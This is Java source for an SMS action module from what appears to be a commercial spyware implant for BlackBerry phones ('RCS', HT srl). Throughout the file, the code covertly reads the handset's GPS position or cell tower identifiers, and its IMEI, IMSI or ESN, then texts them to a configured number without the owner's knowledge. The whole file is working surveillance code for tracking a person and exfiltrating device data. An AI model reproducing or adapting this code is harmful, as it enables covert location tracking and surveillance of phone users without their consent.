//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import javax.microedition.location.Location;
import javax.microedition.location.QualifiedCoordinates;

import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Device;
import blackberry.SMSHelper;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;
import blackberry.utils.Utils;

/**
 * The Class SmsAction.
 */
public final class SmsAction extends SubAction implements LocationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("SmsAction", DebugLevel.VERBOSE);
    //#endif

    private static final int TYPE_LOCATION = 1;
    private static final int TYPE_SIM = 2;
    private static final int TYPE_TEXT = 3;

    String number;
    String text;
    int type;

    public SmsAction(final ConfAction params) {
        super( params);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Trigger triggeringEvent) {

        try {
            switch (type) {
                case TYPE_TEXT:
                case TYPE_SIM:
                    return sendSMS(text);

                case TYPE_LOCATION:
                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                    if (!getGPSPosition()) {
                        errorLocation();
                    }

                    break;
                default:
                    //#ifdef DEBUG
                    debug.error("execute: Not supported type: " + type);
                    //#endif
            }
            return true;
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
            return false;
        }
    }

    private boolean getCellPosition() {

        //#ifdef DEBUG
        debug.trace("getCellPosition");
        //#endif
        String message;

        try {
            if (Device.isGPRS()) {
                // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
                // CC e MNC possono essere estratti da IMEI
                // http://en.wikipedia.org/wiki/Mobile_country_code
                // http://en.wikipedia.org/wiki/Mobile_Network_Code
                final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

                final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
                        .getMCC()));

                final int mnc = cellinfo.getMNC();
                final int lac = cellinfo.getLAC();
                final int cid = cellinfo.getCellId();

                final int bsic = GPRSInfo.getCellInfo().getBSIC();

                final StringBuffer mb = new StringBuffer();
                mb.append("MCC: " + mcc);
                mb.append(" MNC: " + mnc);
                mb.append(" LAC: " + lac);
                mb.append(" CID: " + cid);
                message = mb.toString();
            } else if (Device.isCDMA()) {
                final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
                //CDMAInfo.getIMSI()
                final int sid = cellinfo.getSID();
                final int nid = cellinfo.getNID();
                final int bid = cellinfo.getBID();

                final StringBuffer mb = new StringBuffer();
                mb.append("SID: " + sid);
                mb.append(" NID: " + nid);
                mb.append(" BID: " + bid);
                message = mb.toString();
            } else if (Device.isIDEN()) {
                //#ifdef DEBUG
                debug.error("getCellPosition: IDEN not supported");
                //#endif
                return false;
            } else {
                //#ifdef DEBUG
                debug.trace("getCellPosition: not supported");
                //#endif
                return false;
            }
            //#ifdef DEBUG
            debug.info(message);
            //#endif

            return sendSMS(message);
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
            return false;
        }
    }

    private boolean getGPSPosition() {

      

        if (waitingForPoint) {
            //#ifdef DEBUG
            debug.trace("waitingForPoint");
            //#endif
            return false;
        }

        synchronized (this) {
            LocationHelper.getInstance().start( this, true);
        }

        return true;
    }

    public void newLocation(Location loc) {
        //#ifdef DEBUG
        debug.trace("newLocation");
        //#endif

        if (loc == null) {
            //#ifdef DEBUG
            debug.error("Error in getLocation");
            //#endif  
            return;
        }

        final float speed = loc.getSpeed();
        final float course = loc.getCourse();

        final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
        if (qc == null) {
            //#ifdef DEBUG
            debug.error("Cannot get QualifiedCoordinates");
            //#endif                        
            errorLocation();
        }

        final StringBuffer sb = new StringBuffer();
        sb.append("LAT: " + qc.getLatitude() + "\r\n");
        sb.append("LON: " + qc.getLongitude() + "\r\n");

        sendSMS(sb.toString());

    }

    public synchronized void errorLocation() {
        //#ifdef DEBUG
        debug.error("Cannot get Location");
        //#endif  

        if (!getCellPosition()) {
            sendSMS("Cell and GPS info not available");
        }
    }

    boolean waitingForPoint;

    private String descrType;

    public synchronized void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

    boolean sendSMS(final String message) {
        boolean ret = false;
        if (Device.isCDMA()) {
            //#ifdef DEBUG
            debug.trace("sendSMS: Datagram");
            //#endif
            ret = SMSHelper.sendSMSDatagram(number, message);
        } else if (Device.isGPRS()) {
            //#ifdef DEBUG
            //debug.trace("sendSMS: Binary");
            //#endif
            //ret = sendSMSBinary(message);

            //#ifdef DEBUG
            debug.trace("sendSMS: Text");
            //#endif
            if (Device.isSimEnabled()) {
                ret = SMSHelper.sendSMSText(number, message);
            } else {
                //#ifdef DEBUG
                debug.error("sendSMS: sim not enabled");
                //#endif
            }
        } else if (Device.isIDEN()) {
            //#ifdef DEBUG
            debug.error("sendSMS: Iden not supported");
            //#endif
        } else{
            
        }
        return ret;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final ConfAction params) {
        try {
            number = Utils.unspace( params.getString("number"));
            descrType = params.getString("type");
            if("location".equals(descrType)){
                type=TYPE_LOCATION;
            }else if("text".equals(descrType)){
                type=TYPE_TEXT;             
            }else if("sim".equals(descrType)){
                type=TYPE_SIM;
            }else{
                //#ifdef DEBUG
                debug.error("parse Error, unknown type: " + descrType);
                //#endif
                return false;
            }

            //#ifdef DBC
            Check.asserts(type >= 1 && type <= 3, "wrong type");
            //#endif

            switch (type) {
                case TYPE_TEXT:
                    text = params.getString("text");
                    break;
                case TYPE_LOCATION:
                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                    break;
                case TYPE_SIM:
                    final StringBuffer sb = new StringBuffer();
                    final Device device = Device.getInstance();
                    if (Device.isCDMA()) {

                        sb.append("SID: " + device.getSid() + "\n");
                        sb.append("ESN: "
                                + NumberUtilities.toString(device.getEsn(), 16)
                                + "\n");
                    } 
                    if (Device.isGPRS()) {
                        sb.append("IMEI: " + device.getImei() + "\n");
                        sb.append("IMSI: " + device.getImsi() + "\n");
                    } 
                    if (Device.isIDEN()) {
                        //#ifdef DEBUG
                        debug.error("SmsAction: IDEN not supported");
                        //#endif
                    }

                    text = sb.toString();
                    break;
                default:
                    //#ifdef DEBUG
                    debug.error("SmsAction.parse,  Unknown type: " + type);
                    //#endif
                    break;
            }

        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse");
            //#endif
            return false;
        }

        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        final StringBuffer sb = new StringBuffer();
        sb.append("Sms type: " + type);
        sb.append(" number: " + number);
        sb.append(" text: " + text);

        return sb.toString();
    }
    //#endif

}
